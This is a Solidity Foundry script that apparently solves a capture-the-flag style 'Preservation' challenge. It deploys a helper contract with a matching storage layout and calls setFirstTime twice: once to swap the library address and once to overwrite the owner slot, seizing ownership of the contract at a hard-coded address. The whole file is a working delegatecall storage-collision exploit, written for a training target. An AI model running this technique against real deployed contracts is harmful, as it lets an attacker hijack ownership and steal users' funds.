// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import "forge-std/Script.sol";

contract Ex {
    address public A;
    address public B;
    address public owner;

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}

contract PreservationSol is Script {
    Preservation public pv_ = Preservation(0xd9Cc8c43E7B1297F0C43c1BBfe8025a589490983);

    function run() external {
        vm.startBroadcast();

        Ex ex = new Ex();

        console.log("Ex address:                        ", address(ex));
        console.log("Before owner:                      ", pv_.owner());
        console.log("Before timeZone1Library address:   ", pv_.timeZone1Library());

        pv_.setFirstTime(uint256(uint160(address(ex))));
        console.log("After timeZone1Library address:    ", pv_.timeZone1Library());

        pv_.setFirstTime(uint256(uint160(msg.sender)));
        console.log("After owner:                       ", pv_.owner());

        vm.stopBroadcast();
    }
}